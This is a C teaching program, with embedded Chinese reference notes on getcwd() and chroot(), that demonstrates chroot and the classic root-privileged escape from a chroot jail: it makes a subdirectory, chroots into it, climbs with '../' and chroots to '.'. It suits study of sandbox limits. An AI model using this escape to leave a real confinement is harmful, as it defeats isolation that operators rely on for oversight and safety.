// Scott Kuhl
//
// Demonstration of chroot and how to break out of it. Make sure you
// run "./chroot" because most Linux systems have a chroot binary
// installed in a commonly-used path that your shell may use
// instead. On Ubuntu 14.04, the "chroot" program (which calls the
// chroot() function) in /usr/sbin/chroot
//
// For more information, see:
// https://lwn.net/Articles/252794/
// http://www.lst.de/~okir/blackhats/node122.html

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>


/*
標頭檔：#include <unistd.h>

定義函數：char * getcwd(char * buf, size_t size);

函數說明：getcwd()會將當前的工作目錄絕對路徑複製到參數buf 所指的記憶體空間，參數size 為buf 的空間大小。

注：
1、在呼叫此函數時，buf 所指的記憶體空間要足夠大。若工作目錄絕對路徑的字串長度超過參數size 大小，則返回NULL，errno 的值則為ERANGE。
2、倘若參數buf 為NULL，getcwd()會依參數size 的大小自動配置記憶體(使用malloc())，如果參數size 也為0，則getcwd()會依工作目錄絕對路徑的字串程度來決定所配置的記憶體大小，進程可以在使用完次字串後利用free()來釋放此空間。

返回值：執行成功則將結果複製到參數buf 所指的記憶體空間, 或是返回自動配置的字串指標. 失敗返回NULL,錯誤代碼存於errno.

範例
#include <unistd.h>
main()
{
    char buf[80];
    getcwd(buf, sizeof(buf));
    printf("current working directory : %s\n", buf);
}


標頭檔：#include <unistd.h>

定義函數：int chroot(const char * path);

函數說明：chroot()用來改變根目錄為參數path 所指定的目錄。只有超級使用者才允許改變根目錄，子進程將繼承新的根目錄。

返回值：呼叫成功則返回0, 失敗則返-1, 錯誤代碼存於errno.

錯誤代碼：
1、EPERM 許可權不足, 無法改變根目錄。
2、EFAULT 參數path 指標超出可存取記憶體空間。
3、ENAMETOOLONG 參數path 太長。
4、ENOTDIR 路徑中的目錄存在但卻非真正的目錄。
5、EACCESS 存取目錄時被拒絕。
6、ENOMEM 核心記憶體不足。
7、ELOOP 參數path 有過多符號連接問題。
8、EIO I/O 存取錯誤。

範例
// 將根目錄改為/tmp, 並將工作目錄切換至/tmp 
#include <unistd.h>
main()
{
    chroot("/tmp");
    chdir("/");
}


*/



int main(void)
{
	char *str;
	int  ret;
	char buf[1024];
	str = getcwd(buf, 1024);
	printf("current working directory: %s\n", buf);


	// The file "/Makefile" probably doesn't exist on your computer.
	//struct stat {
	//    dev_t     st_dev;     /* ID of device containing file */
	//    ino_t     st_ino;     /* inode number */
	//    mode_t    st_mode;    /* protection */
	//    nlink_t   st_nlink;   /* number of hard links */
	//    uid_t     st_uid;     /* user ID of owner */
	//    gid_t     st_gid;     /* group ID of owner */
	//    dev_t     st_rdev;    /* device ID (if special file) */
	//    off_t     st_size;    /* total size, in bytes */
	//    blksize_t st_blksize; /* blocksize for file system I/O */
	//    blkcnt_t  st_blocks;  /* number of 512B blocks allocated */
	//    time_t    st_atime;   /* time of last access */
	//    time_t    st_mtime;   /* time of last modification */
	//    time_t    st_ctime;   /* time of last status change */
	//};
	struct stat statBuf;
	
	//int stat(const char *path, struct stat *buf);
	if(stat("./Makefile", &statBuf) == -1)
		perror("stat(Makefile)");
	else {
		printf("found Makefile\n");
		printf("Makefile file size = %ld \n", statBuf.st_size);
	}
	if(chroot(buf) == -1) // make the current directory be /
	{
		perror("chroot");
		printf("Have you tried running this as root?\n");
		exit(EXIT_FAILURE);
	}

	// From this point on, this program will think that the root
	// directory "/" is this directory!
	str = getcwd(buf, 1024);
	printf("current working directory: %s\n", buf);
	// The file "/Makefile" should exist!
	if(stat("./Makefile", &statBuf) == -1)
		perror("stat(Makefile)");
	else
		printf("found Makefile\n");

	/* It is possible to break out of chroot using this approach. This
	 * general approach is not a secret and is documented in the
	 * chroot man page. */
	printf("Breaking out of chroot....\n");
	mkdir("chroot.temp", 0777);
	ret = chroot("chroot.temp"); // Now we are not inside of the new root!?!
	if(ret != 0) {
		printf("\n chroot(\"chroot.temp\") err %d",ret);
		return -1;
	}	
	rmdir("chroot.temp"); // cleanup after ourselves

	str = getcwd(buf, 1024);
	printf("current working directory (escape part 1): %s\n", buf);

	// Try to cd into the real root.
	ret = chdir("../../../../../../../../../../../../../../");
	if(ret != 0) {
		printf("\n chdir(\"../../../../../../../../../../../../../../\") err %d",ret);
		return -1;
	}
	str = getcwd(buf, 1024);
	printf("current working directory (escape part 2): %s\n", buf);

	// Did we get out of the chroot?
	ret = chroot(".");
	if(ret != 0) {
		printf("\n hroot(\".\") err %d",ret);
		return -1;
	}
	str = getcwd(buf, 1024);
	printf("current working directory (escape part 3): %s\n", buf);

	// List the files in this directory so you can verify that we got
	// out.
	printf("listing of files in this directory\n");
	execlp("ls", "/", NULL);
	
	
	//fix not used warning
	ret = ret;
	str = str;
}
